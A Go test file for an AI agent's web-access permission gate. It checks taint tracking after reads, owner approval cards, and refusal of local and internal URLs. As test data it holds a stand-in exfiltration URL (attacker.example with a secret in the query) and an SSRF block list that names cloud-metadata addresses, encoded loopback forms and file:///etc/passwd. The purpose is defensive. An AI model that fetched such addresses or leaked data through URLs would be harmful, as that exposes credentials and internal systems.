package main

import (
	"context"
	"encoding/json"
	"slices"
	"strconv"
	"strings"
	"testing"
	"time"
)

// brainAsks records, on the test brain, the tool calls of one message of
// its and the permissions they wait on, then lets eriphe-core answer them.
func brainAsks(t *testing.T, c *core, calls ...[2]any) {
	t.Helper()
	task, _ := c.store.task("t-brain")
	seq := task.LastSeq
	var evs []EventRow
	for _, call := range calls {
		seq++
		evs = append(evs, EventRow{Seq: seq, Time: time.Now(), Type: "tool_use", Data: map[string]any{"name": call[0], "input": call[1]}})
	}
	for _, call := range calls {
		seq++
		evs = append(evs, EventRow{Seq: seq, Time: time.Now(), Type: "permission",
			Data: map[string]any{"id": "p" + itoa(seq), "tool_name": call[0], "input": call[1]}})
	}
	c.store.addEvents("t-brain", evs)
	c.store.updateTask("t-brain", map[string]any{"state": stateWaitingPermission})
	task, _ = c.store.task("t-brain")
	if err := c.brainPermission(context.Background(), task); err != nil {
		t.Fatal(err)
	}
}

func itoa(n int) string { return strconv.Itoa(n) }

func fetch(u string) [2]any { return [2]any{"WebFetch", map[string]any{"url": u, "prompt": "résume"}} }

// answers are the brain's permissions answered since the start, by URL (or
// tool): true allowed, false refused; absent, the user's.
func answers(t *testing.T, c *core) map[string]bool {
	t.Helper()
	items, _ := c.store.inbox("t-brain")
	events, _ := c.store.events("t-brain", 500)
	byID := map[string]string{}
	for _, e := range events {
		if e.Type == "permission" {
			in, _ := e.Data["input"].(map[string]any)
			key, _ := in["url"].(string)
			if key == "" {
				key = e.Data["tool_name"].(string)
			}
			byID[e.Data["id"].(string)] = key
		}
	}
	out := map[string]bool{}
	for _, it := range items {
		if it.Kind == "permission" {
			out[byID[it.Data["id"].(string)]] = it.Data["allow"].(bool)
		}
	}
	return out
}

func TestBrainWebFetch(t *testing.T) {
	c, _ := testMemoryCore(t)
	ownerSays(c, "Lis https://docs.example.org/guide et dis-moi")

	// A clean turn: the read is free, and two asked together both are.
	brainAsks(t, c, fetch("https://news.example.com/a"), fetch("https://news.example.com/b"))
	got := answers(t, c)
	if !got["https://news.example.com/a"] || !got["https://news.example.com/b"] {
		t.Fatalf("clean turn: %v", got)
	}
	if tainted := c.turnTaint(); !containsStr(tainted, "WebFetch") {
		t.Fatalf("a read does not taint: %v", tainted)
	}

	// Tainted now: a new URL is mine to decide on a card, and the brain goes on.
	brainAsks(t, c, fetch("https://attacker.example/?q=secret"))
	if allow, ok := answers(t, c)["https://attacker.example/?q=secret"]; !ok || allow {
		t.Fatalf("the brain is held, or reads: %v %v", ok, allow)
	}
	x := accessCard(t, c, "read this page")
	if _, p := c.liveCard(x); !slices.Contains(p.Fields, cardField{"url", "https://attacker.example/?q=secret"}) {
		t.Fatalf("the card does not say the page: %+v", p.Fields)
	}
	// Refused on the card: still nothing goes through.
	if _, err := c.decideCard(context.Background(), x.ID, false, "web"); err != nil {
		t.Fatal(err)
	}
	if c.usePageYes("https://attacker.example/?q=secret") {
		t.Fatal("a no let the page through")
	}

	// A yes lets that page through, once.
	brainAsks(t, c, fetch("https://asked.example/"))
	if _, err := c.decideCard(context.Background(), accessCard(t, c, "read this page").ID, true, "web"); err != nil {
		t.Fatal(err)
	}
	waitEvent(t, c, "tu peux lire la page https://asked.example/")
	brainAsks(t, c, fetch("https://asked.example/"))
	if !answers(t, c)["https://asked.example/"] {
		t.Fatal("the yes did not let the page through")
	}
	if c.usePageYes("https://asked.example/") {
		t.Fatal("the yes was not used up")
	}

	// The URL I wrote in this turn's message stays free, with or without its final slash.
	brainAsks(t, c, fetch("https://docs.example.org/guide/"))
	if !answers(t, c)["https://docs.example.org/guide/"] {
		t.Fatal("my own URL was not allowed on a tainted turn")
	}

	// A new message of mine: a clean turn again.
	ownerSays(c, "Autre chose")
	brainAsks(t, c, fetch("https://example.net/page"))
	if !answers(t, c)["https://example.net/page"] {
		t.Fatal("clean turn after my message")
	}
}

func lastSeq(c *core) int {
	task, _ := c.store.task("t-brain")
	return task.LastSeq
}

func TestBrainWebFetchLocal(t *testing.T) {
	c, _ := testMemoryCore(t)
	ownerSays(c, "Regarde http://localhost:8080 et http://192.168.0.2/admin")
	local := []string{"http://localhost:8080", "http://192.168.0.2/admin", "http://127.0.0.1/", "http://[::1]:80/",
		"http://10.0.0.1", "http://169.254.169.254/latest", "http://100.100.100.100/", "http://nas/", "http://printer.local/",
		"http://127.1/", "http://0x7f000001/", "http://2130706433/", "file:///etc/passwd", "http://[::ffff:192.168.0.1]/",
		"http://router.home.arpa/", "https://user:pw@example.com/"}
	var calls [][2]any
	for _, u := range local {
		calls = append(calls, fetch(u))
	}
	brainAsks(t, c, calls...)
	got := answers(t, c)
	for _, u := range local {
		if allow, ok := got[u]; !ok || allow {
			t.Errorf("%s: answered %v, allowed %v", u, ok, allow)
		}
	}
	for _, u := range []string{"https://example.com/", "http://8.8.8.8/", "https://[2606:4700::1111]/"} {
		if why := localURL(u); why != "" {
			t.Errorf("%s refused: %s", u, why)
		}
	}
}

func TestBrainWebSearchAndRules(t *testing.T) {
	c, _ := testMemoryCore(t)
	ownerSays(c, "Cherche")
	c.conf().Policy = &Policy{Rules: []Rule{{Tool: "WebFetch", Match: `blocked\.example`, Decision: decideDeny, Reason: "non"}}}
	if err := c.conf().Policy.compile(); err != nil {
		t.Fatal(err)
	}
	brainAsks(t, c, [2]any{"WebSearch", map[string]any{"query": "météo"}}, fetch("https://blocked.example/"), [2]any{"Bash", map[string]any{"command": "ls"}})
	got := answers(t, c)
	if !got["WebSearch"] || got["https://blocked.example/"] || got["Bash"] {
		t.Fatalf("answers = %v", got)
	}
	// The search taints: a read after it is mine.
	brainAsks(t, c, fetch("https://result.example.com/"))
	if answers(t, c)["https://result.example.com/"] {
		t.Fatal("a read after a search was allowed")
	}
}

// The brain's spec allows its web search in advance, not its page reader;
// a harness without a search of its own is told.
func TestBrainWebSpec(t *testing.T) {
	c, _ := testMemoryCore(t)
	spec := func() nodeTaskSpec {
		var raw string
		c.store.db.QueryRow(`SELECT spec FROM tasks WHERE id = ?`, brainStatus(c).Task).Scan(&raw)
		var s nodeTaskSpec
		json.Unmarshal([]byte(raw), &s)
		return s
	}
	startedBrain(t, c, false)
	s := spec()
	if !slices.Contains(s.AllowedTools, "WebSearch") || slices.Contains(s.AllowedTools, "WebFetch") {
		t.Fatalf("allowed = %v", s.AllowedTools)
	}
	if strings.Contains(s.AppendSystemPrompt, noWebSearchLine) {
		t.Fatal("Claude Code searches: told it cannot")
	}
	c.conf().Agents["small"] = Agent{Runtime: "opencode", Provider: "p", Model: "anthropic/x"}
	c.store.setNodeStatus("nas", true, []byte(`{"runtimes":["claude-code","opencode"]}`))
	c.store.setNodeStatus("nas", false, nil)
	startedBrain(t, c, false)
	if s := spec(); !strings.Contains(s.AppendSystemPrompt, noWebSearchLine) {
		t.Fatalf("OpenCode not told it cannot search: %q", s.AppendSystemPrompt)
	}
}
